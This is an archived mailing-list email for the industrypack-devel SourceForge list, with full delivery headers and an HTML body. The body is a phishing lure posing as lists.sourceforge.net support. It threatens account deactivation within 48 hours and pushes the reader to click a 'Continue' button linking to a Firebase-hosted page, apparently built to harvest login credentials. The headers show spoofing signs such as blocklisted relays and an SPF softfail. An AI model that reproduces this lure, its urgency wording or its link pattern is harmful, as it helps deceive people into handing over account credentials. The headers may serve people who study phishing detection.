Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id BD4964044E2
	for <lists+industrypack-devel@lfdr.de>; Thu,  9 Sep 2021 07:20:00 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=N3anTv11kwC9drQGuK8d4C6rZu0aqbVweiCsJ/XCJU0=; b=bmZbJmz4p6BqB8QmYmhXsv9OCM
	xNfOMwrZac+oykYmMW/BV2oVYu3jhKw1B0JLmef3I1ukQf1chhmMiy0MDYfUMLDmWBfEA4IuqTtOD
	vagenbXikcGpxBVNDchIJYIIzgpXzunajRzdGIIScbovYQQ6g6RsrXoDjk/5EfgX87bM=;
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mOCTf-0005Mt-HA
	for lists+industrypack-devel@lfdr.de; Thu, 09 Sep 2021 05:19:59 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <donotreply@lists.sourceforge.net>)
 id 1mOCTe-0005Mg-DX
 for industrypack-devel@lists.sourceforge.net; Thu, 09 Sep 2021 05:19:58 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=53AXYaWi3DItNjzO3Pi2+XoOYHTdW3GxKc6BCkkJ6EQ=; b=PTAT5czFJJHdQP7GP0BqqaOSvt
 u3UN/vB/ptXx26AwTZXmyBFecMino5zEMyal3xhGbF8ZPx/ZrE6o52OCMHW5sVBSOVwNaUcGEJ3tW
 sus1W2tGffraSIZy5GpmGYDD//VqNxdzX2zW3d9jLI0blzvG56Xu1tzRG0mngj0D20Hk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=53AXYaWi3DItNjzO3Pi2+XoOYHTdW3GxKc6BCkkJ6EQ=; b=R
 1a7VmxIKXoMODpo89lw5M+9c+9xDm3LkfHTOH8eIqn8tvbyqRv3/evx1R3NT/AC3EWhu5oXYptdc6
 CPiFe2WGLPkRNjTGNfR7vaTfkQsy4hDRGxXpKryNEQtzPwPITEDd7XRlu03T4BvAj+5RlH7qXnJMU
 9cZyZ4V16G2Jklfo=;
Received: from webmail.goodfaith.co.in ([180.150.250.219])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mOCTY-0004sV-OM
 for industrypack-devel@lists.sourceforge.net; Thu, 09 Sep 2021 05:19:58 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=vayak.net; 
 s=default;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:
 Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
 In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=53AXYaWi3DItNjzO3Pi2+XoOYHTdW3GxKc6BCkkJ6EQ=; b=nA2YoIBVJckSGWLS4KU8Sl9RRQ
 cNperc+KRGGfmoUMQkrs9rTDdIMDoRNopX2U44RHQ1tE/+q9mno5HloApRdkGD0A+fBT/WSVlXYOQ
 DU8wPhWkZ7CtnwXgdYCcfEhjVFaeitWpw7MhjKGuKGLG1nAH9tJpet5UlLwOHzwG8nPqyVsMkp/wU
 JXyaHmAPNzyH3LBv+p0k14CHScjqFNYJjT91gBZt9NxKiVBo1+uIfIJPx9g/HraWeXxEQ6cmiSuXf
 WGie3njls7vNKYv4CQFNkkNFi6rPetCceYBNfvX1hu0vLErFaLljXronh3NwUWiL+zxyG481AJdE2
 9hYvOpRw==;
Received: from [45.147.229.88] (port=54531 helo=ed.ac.uk)
 by webhosting.ntpldatafirst.com with esmtpa (Exim 4.94.2)
 (envelope-from <donotreply@lists.sourceforge.net>)
 id 1mNex9-0005uw-12
 for industrypack-devel@lists.sourceforge.net; Tue, 07 Sep 2021 23:02:12 +0530
To: industrypack-devel@lists.sourceforge.net
Date: 07 Sep 2021 10:32:12 -0700
Message-ID: <20210907103212.4ACFA49A832766E5@lists.sourceforge.net>
MIME-Version: 1.0
X-AntiAbuse: This header was added to track abuse,
 please include it with any abuse report
X-AntiAbuse: Primary Hostname - webhosting.ntpldatafirst.com
X-AntiAbuse: Original Domain - lists.sourceforge.net
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - lists.sourceforge.net
X-Get-Message-Sender-Via: webhosting.ntpldatafirst.com: authenticated_id:
 info@vayak.net
X-Authenticated-Sender: webhosting.ntpldatafirst.com: info@vayak.net
X-Source: 
X-Source-Args: 
X-Source-Dir: 
X-Spam-Score: 4.8 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 @@CONTACT_ADDRESS@@ for details.
 Content preview: Hello industrypack-devel To continue Using your
 (industrypack-devel@lists.sourceforge.net), 
 confirm security protocols below to prevent server deactivation 48hrs from
 Message time. Message time: 9/7/2021 10:32:12 a.m. . 
 Content analysis details:   (4.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.6 RCVD_IN_SBL            RBL: Received via a relay in Spamhaus SBL
 [45.147.229.88 listed in zen.spamhaus.org]
 0.5 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [180.150.250.219 listed in dnsbl-1.uceprotect.net]
 0.5 DATE_IN_PAST_24_48     Date: is 24 to 48 hours before Received: date
 1.1 DKIM_ADSP_ALL          No valid author signature, domain signs all mail
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: vayak.net]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid -1.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [180.150.250.219 listed in wl.mailspike.net]
X-Headers-End: 1mOCTY-0004sV-OM
Subject: [Industrypack-devel] lists.sourceforge.net User's System  Alerts
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: Support via Industrypack-devel <industrypack-devel@lists.sourceforge.net>
Reply-To: Support <donotreply@lists.sourceforge.net>
Content-Type: multipart/mixed; boundary="===============5162670061574244667=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============5162670061574244667==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD><TITLE></TITLE>
<META content=3D"text/html; charset=3DISO-8859-1" http-equiv=3Dcontent-type=
>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<P style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Tahoma, Helvetica, sans-s=
erif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
IGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LE=
TTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-sty=
le: initial; text-decoration-color: initial; text-decoration-thickness: ini=
tial"><FONT size=3D3 face=3D"Times New Roman">
Hello industrypack-devel<BR><BR></FONT>To continue Using your (industrypack=
-devel@lists.sourceforge.net), confirm&nbsp;security protocols below&nbsp;t=
o prevent server deactivation 48hrs from Message time.<BR><BR>Message time:=
 9/7/2021 10:32:12 a.m. .<BR><BR><BR>
<A style=3D"BORDER-TOP: rgb(25,118,210) 14px solid; BORDER-RIGHT: rgb(25,11=
8,210) 14px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: rgb(25,118,210)=
 14px solid; COLOR: rgb(255,255,255); OUTLINE-WIDTH: medium; PADDING-BOTTOM=
: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; BORDER-LEF=
T: rgb(25,118,210) 14px solid; MARGIN: 0px; DISPLAY: inline-block; PADDING-=
RIGHT: 0px; BACKGROUND-COLOR: rgb(25,118,210); border-radius: 0px"=20
href=3D"https://firebasestorage.googleapis.com/v0/b/e74789-1632a.appspot.co=
m/o/213463421.html?alt=3Dmedia&amp;token=3Dffe50e94-2d88-4162-b9e7-adc82f73=
de58#industrypack-devel@lists.sourceforge.net" rel=3D"noopener noreferrer" =
target=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://firebasestor=
age.googleapis.com/v0/b/rwv-34gf-wer3-4fwev-43fwev.appspot.com/o/xdw-d3-w-e=
fr-55grfv-g-44f4e%252F54g-r-35gr-v-g43-vc-r.html?alt%3Dmedia%26token%3D136d=
cc6e-cbed-43f7-969c-bc78755252eb%23servis@mamba-air.cz&amp;source=3Dgmail&a=
mp;ust=3D1630771538436000&amp;usg=3DAFQjCNHQc6fmw8_Y2Gq6rTvjup8JRrb3zg"><ST=
RONG style=3D"border-radius: 0px"><SPAN style=3D"FONT-FAMILY: arial, sans-s=
erif; border-radius: 0px">Continue &#8594;</SPAN></STRONG></A>
 <STRONG style=3D"border-radius: 0px"><A style=3D"COLOR: rgb(0,136,204)" hr=
ef=3D"https://firebasestorage.googleapis.com/v0/b/e74789-1632a.appspot.com/=
o/213463421.html?alt=3Dmedia&amp;token=3Dffe50e94-2d88-4162-b9e7-adc82f73de=
58#industrypack-devel@lists.sourceforge.net" target=3D_blank>industrypack-d=
evel@lists.sourceforge.net</A><BR></STRONG><BR></P>
<P style=3D"FONT-SIZE: 15px; MARGIN-BOTTOM: 0px; FONT-FAMILY: Calibri, Helv=
etica, sans-serif, serif, EmojiFont; WHITE-SPACE: normal; WORD-SPACING: 0px=
; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31=
,30); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BA=
CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures:=
 normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
coration-style: initial; text-decoration-color:=20
initial; text-decoration-thickness: initial"><B>Thank You. Please do not re=
ply to this message. Mail sent to this address cannot be answered.<BR></B><=
/P>
<P style=3D"FONT-SIZE: 15px; MARGIN-BOTTOM: 0px; FONT-FAMILY: Calibri, Helv=
etica, sans-serif, serif, EmojiFont; WHITE-SPACE: normal; WORD-SPACING: 0px=
; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31=
,30); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BA=
CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures:=
 normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
coration-style: initial; text-decoration-color:=20
initial; text-decoration-thickness: initial"><B></B>&nbsp;</P>
<P style=3D"FONT-SIZE: 15px; MARGIN-BOTTOM: 0px; FONT-FAMILY: Calibri, Helv=
etica, sans-serif, serif, EmojiFont; WHITE-SPACE: normal; WORD-SPACING: 0px=
; MARGIN-TOP: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31=
,30); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BA=
CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures:=
 normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-de=
coration-style: initial; text-decoration-color:=20
initial; text-decoration-thickness: initial"><STRONG>&copy; 2021 </STRONG><=
STRONG>lists.sourceforge.net </STRONG><STRONG>&nbsp;All rights reserved. </=
STRONG></P>
<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Roboto, Tahoma, Helvetica, sans=
-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-=
WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; =
LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; f=
ont-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-s=
tyle: initial; text-decoration-color: initial; text-decoration-thickness: i=
nitial">
<P style=3D"FONT-SIZE: 15px; FONT-FAMILY: Consolas, Courier, monospace; COL=
OR: rgb(32,31,30); border-radius: 0px"></P>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: Consola=
s, Courier, monospace; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; B=
ORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(32,31,30); PADDING-BOTTOM: 0px; PADDING=
-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-W=
IDTH: 0px; border-radius: 0px; font-stretch: inherit">
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALI=
GN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0=
px; border-radius: 0px">
<P style=3D"COLOR: rgb(0,0,0); border-radius: 0px"><STRONG style=3D"border-=
radius: 0px"><BR></STRONG>&nbsp;</P></DIV></DIV></DIV></BODY></HTML>


--===============5162670061574244667==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5162670061574244667==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5162670061574244667==--
